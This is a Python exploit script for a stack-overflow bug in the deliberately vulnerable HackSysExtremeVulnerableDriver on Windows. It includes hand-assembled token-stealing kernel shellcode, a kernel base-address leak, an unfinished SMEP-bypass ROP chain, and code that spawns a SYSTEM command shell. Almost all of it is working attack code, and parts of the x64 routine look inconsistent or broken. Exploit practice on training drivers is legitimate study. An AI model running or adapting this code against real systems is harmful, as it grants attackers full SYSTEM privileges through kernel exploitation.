
#
# Implemented NtQuerySystemInformation and SYSTEM_MODULE_INFORMATION
# for the purpose of KROP to defeat SMEP/SMAP on Windows 10 x64 1709
# but didn't have the time to get the SDK for Kernel debugging.
# Python 3.7.3 - x86 Python will generate x86 pointers, x64 will
# generate x64 pointers.
#
# Windows 7 SP1 x86 HackSysExtremeVulnerableDriver 2, Stack Overflow
# Author: Charles Truscott @r0ss1n1
# github.com/r0ss1n1
#





from ctypes import *
from ctypes.wintypes import *
import sys, struct, time
import os



ntdll = windll.ntdll
kernel32 = windll.kernel32

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040

CREATE_NEW_CONSOLE = 0x00000010
GENERIC_READ_WRITE = 0xC0000000
OPEN_EXISTING = 0x00000003
FILE_ATTRIBUTE_NORMAL = 0x00000080

HANDLE = c_void_p
LPTSTR = c_void_p
LPBYTE = c_char_p


FILE_DEVICE_UNKNOWN = 0x00000022
FILE_ANY_ACCESS = 0x00000000
METHOD_NEITHER = 0x00000003



CreateProcess = windll.kernel32.CreateProcessW
VirtualAlloc = windll.kernel32.VirtualAlloc
CreateFile = windll.kernel32.CreateFileW
DeviceIoControl = windll.kernel32.DeviceIoControl
VirtualLock = windll.kernel32.VirtualLock
class STARTUPINFO(Structure):

	_fields_ = [("cb", DWORD),
		("lpReserved", LPTSTR),
		("lpDesktop", LPTSTR),
		("lpTitle", LPTSTR),
		("dwX", DWORD),
		("dwY", DWORD),
		("dwXSize", DWORD),
		("dwYSize", DWORD),
		("dwXCountChars", DWORD),
		("dwYCountChars", DWORD),
		("dwFillAttribute", DWORD),
		("dwFlags", DWORD),
		("wShowWindow", WORD),
		("cbReserved2", WORD),
		("lpReserved2", LPBYTE),
		("hStdInput", HANDLE),
		("hStdOutput", HANDLE),
		("hStdError", HANDLE)]

class PROCESS_INFORMATION(Structure):

	_fields_ = [("hProcess", HANDLE),
		("dwProcessId", DWORD),
		("dwThreadId", DWORD)]

class SYSTEM_MODULE_INFORMATION(Structure):
    _fields_ = [("Reserved", c_void_p * 2),
                ("ImageBase", c_void_p), 
                ("ImageSize", c_long),
                ("Flags", c_ulong),
                ("LoadOrderIndex", c_ushort),
                ("InitOrderIndex", c_ushort),
                ("LoadCount", c_ushort),
                ("ModuleNameOffset", c_ushort),
                ("FullPathName", c_char * 256)]


def heap_alloc_payload():
	#---[Setup]
	token_stealing_shellcode = "\xB9".encode() + struct.pack("<L", os.getpid())      # mov ecx, PID
	token_stealing_shellcode += "\x65\x48\x8B\x04\x25\x88\x01\x00\x00".encode()      # mov rax,QWORD PTR gs:0x188
	token_stealing_shellcode += "\x48\x8B\x80\xB8\x00\x00\x00".encode()              # mov rax,QWORD PTR [rax+0xb8] EPROCESS
	token_stealing_shellcode += "\x48\x8d\x80\xf0\x02\x00\x00".encode()              # lea rax,[rax+0x2f0] # ActiveProcessLink
	#---[Copy System PID token]
	token_stealing_shellcode += "\x48\x8b\x00".encode()                              # mov rax,QWORD PTR [rax]
	token_stealing_shellcode += "\x48\x8b\x58\xf8".encode()                          # mov rbx,QWORD PTR [rax-0x8] # UniqueProcessID
	token_stealing_shellcode += "\x48\x83\xfb\x04".encode()                          # cmp rbx,0x4
	token_stealing_shellcode += "\x75\xf3".encode()                                  # jne
	token_stealing_shellcode += "\x48\x8b\x58\x68".encode()                          # mov rbx, QWORD PTR [rax+0x68] # GET TOKEN of SYSTEM
	#---[Paste System PID token in Current Process]
	token_stealing_shellcode += "\x53".encode()                                      # PUSH RBX
	token_stealing_shellcode += "\x48\x8b\x00".encode()                              # mov    rax,QWORD PTR [rax]
	token_stealing_shellcode += "\x48\x8b\x58\xf8".encode()                          # mov    rbx,QWORD PTR [rax-0x8] # UniqueProcessID
	token_stealing_shellcode += "\x39\xcb".encode()                                  # cmp    ebx, ecx # our PID
	token_stealing_shellcode += "\x75\xf5".encode()                                  # jne
	token_stealing_shellcode += "\x5b".encode()                                      # POP RBX
	token_stealing_shellcode += "\x48\x89\x58\x68".encode()                          # mov    QWORD PTR[rax + 0x68], rbx
	#---[Recover]
	token_stealing_shellcode += "\x48\x31\xC0".encode()                              # NTSTATUS -> STATUS_SUCCESS
	token_stealing_shellcode += "\x48\x83\xC4\x28".encode()                          # add rsp, 0x28
	token_stealing_shellcode += "\xC3".encode()                                      # ret
		
	shellcode = bytearray(token_stealing_shellcode)
	
	payload_length = len(token_stealing_shellcode)
	payload_address = id(token_stealing_shellcode) + 32
	shellcode_address = id(shellcode) + 32
	print(hex(shellcode_address))
	lpAddress = None
	dwSize = len(shellcode)
	flAllocationType = (MEM_COMMIT | MEM_RESERVE)
	flProtect = 0x40
	print(flProtect)
	shellcode = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
	addr = VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
	print((addr))
	if not addr or addr == -1:
		sys.exit()
	print(hex(addr))
	old = ctypes.c_long(1)
	ctypes.windll.kernel32.VirtualLock(addr, int(len(shellcode)))
	#ctypes.windll.kernel32.RtlMoveMemory(addr, shellcode, len(shellcode))
	flProtect = 0x40
	#ctypes.windll.kernel32.VirtualProtect(addr, ctypes.c_int(len(shellcode)), flProtect, ctypes.byref(old))
	memmove(addr, payload_address, int(payload_length))
	print(hex(addr))
	print("Address is " + str(hex(addr)))
	#ret = hex(addr)[::-1]
	return addr

def get_base_address(input_modules):
	modules = {}

	# Allocate arbitrary buffer and call NtQuerySystemInformation
	system_information = create_string_buffer(0)
	systeminformationlength = c_ulong(0)
	ntdll.NtQuerySystemInformation(11, system_information, len(system_information), byref(systeminformationlength))
	print(system_information)
	# Call NtQuerySystemInformation second time with right size
	system_information = create_string_buffer(systeminformationlength.value)
	ntdll.NtQuerySystemInformation(11, system_information, len(system_information), byref(systeminformationlength))
	print(system_information)
        # Read first 4 bytes which contains number of modules retrieved
	module_count = c_ulong(0)
	module_count_string = create_string_buffer(system_information.raw[:8])
	ctypes.memmove(addressof(module_count), module_count_string, sizeof(module_count))
	
	# Marshal each module information and store it in a dictionary<name, SYSTEM_MODULE_INFORMATION>
	system_information = create_string_buffer(system_information.raw[8:])
	for x in range(module_count.value):
		smi = SYSTEM_MODULE_INFORMATION()
		temp_system_information = create_string_buffer(system_information.raw[sizeof(smi) * x: sizeof(smi) * (x+1)])
		ctypes.memmove(addressof(smi), temp_system_information, sizeof(smi))
		module_name =  smi.FullPathName.split(b'\\')[-1]
		print(smi.FullPathName)
		print(module_name)
		modules[module_name] = smi
		
	
		
	# Get base addresses and return them in a list
	base_addresses = []
	for input_module in input_modules:
		try:
			base_address = modules[input_module].ImageBase
			print("\t[-] %s base address: 0x%X" % (input_module, base_address))
			base_addresses.append(base_address)
		except:
			base_addresses.append(0)
	print(base_addresses)
	return base_addresses
	

def create():

	lpApplicationName=u"c:\\windows\system32\\cmd.exe"
	lpCommandLine=u"c:\\windows\\system32\\cmd.exe"
	lpProcessAttributes=None
	lpThreadAttributes=None
	bInheritHandles=0
	dwCreationFlags=CREATE_NEW_CONSOLE
	lpEnvironment = None
	lpCurrentDirectory = None
	lpStartupInfo = STARTUPINFO()
	lpStartupInfo.cb = sizeof(lpStartupInfo)
	lpProcessInformation = PROCESS_INFORMATION()

	ret = CreateProcess(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, byref(lpStartupInfo), byref(lpProcessInformation))

	time.sleep(1)
	return lpProcessInformation.dwProcessId

def gethandle():

	lpFileName = u"\\\\.\\HacksysExtremeVulnerableDriver"
	dwDesiredAccess = GENERIC_READ_WRITE
	dwShareMode = 0
	lpSecurityAttributes = None
	dwCreationDisposition = OPEN_EXISTING
	dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL
	hTemplateFile = None

	handle = CreateFile(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile)
	if not handle or handle == -1:
		print("error")
	print(handle)
	return handle

def ctl_code(function, devicetype = FILE_DEVICE_UNKNOWN, access = FILE_ANY_ACCESS, method = METHOD_NEITHER):
	return ((devicetype << 16) | (access << 14) | function << 2 | method)

def shellcode(pid):
        tokenstealing = b"\x60\x31\xc0\x64\x8b\x80\x24\x01\x00\x00"
        tokenstealing+= b"\x8b\x40\x50\x8b\xc8\xba\x04\x00\x00\x00"
        tokenstealing+= b"\x8b\x80\xb8\x00\x00\x00\x2d\xb8\x00"
        tokenstealing+= b"\x00\x00\x39\x90\xb4\x00\x00\x00\x75"
        tokenstealing+= b"\xed\x8b\x90\xf8\x00\x00\x00\x89\x91\xf8"
        tokenstealing+= b"\x00\x00\x00\x61\x31\xc0\x5d\xc2\x08\x00"

        lpAddress = None
        print(struct.pack("<I", pid))
        dwSize = len(tokenstealing)
        flAllocationType = (MEM_COMMIT | MEM_RESERVE)
        flProtect = PAGE_EXECUTE_READWRITE

        addr = VirtualAlloc(None, 0x0000900, 0x00003000, 0x00000040)
        if not addr or addr == -1:
                sys.exit()
        VirtualLock(addr, int(len(tokenstealing)))
        memmove(addr, tokenstealing, int(len(tokenstealing)))

        print(struct.pack("<I", addr))
        return addr

def trigger(hDevice, dwIoControlCode, scAddr):
        overflow = "A".encode() * 2080
        #overflow = "A".encode() * 20
        print(struct.pack("<L", scAddr))
        print(hex(scAddr))
        inBuffer = create_string_buffer(overflow + struct.pack("<L", scAddr))
        lpInBuffer = addressof(inBuffer)
        nInBufferSize = len(inBuffer)-1
        lpOutBuffer = None
        nOutBufferSize = 0
        lpBytesReturned = byref(c_ulong())
        lpOverlapped = None
        pwnd = DeviceIoControl(hDevice, dwIoControlCode, lpInBuffer, nInBufferSize, lpOutBuffer, nOutBufferSize, lpBytesReturned, lpOverlapped)
        print(pwnd)
base_addresses = get_base_address([b"ntoskrnl.exe", b"win32kfull.sys"])
kernelbase = hex(base_addresses[0])
print("Kernel base = " + str(kernelbase))
#pid = create()
print(base_addresses)
#rop1 = base_addresses[0] + 0x597B
#rop2 = 0x506F8
#rop3 = base_addresses[0] + 0x108552
#rop4 = heap_alloc_payload()
#ret =
#second_ret =
#third_ret =
#fourth_ret =
#print(rop1)
#chain = struct.pack("<Q", kernelbase + 0x597B)
#chain+= struct.pack("<Q", 0x506F8)
#chain+= struct.pack("<Q", base_addresses[0] + 0x108552)
#chain+= struct.pack("<Q", heap_alloc_payload())
#print(hex(rop))
#print(kernel)
trigger(gethandle(), ctl_code(0x800), shellcode(os.getpid()))
#print(gethandle())
os.system("cmd.exe")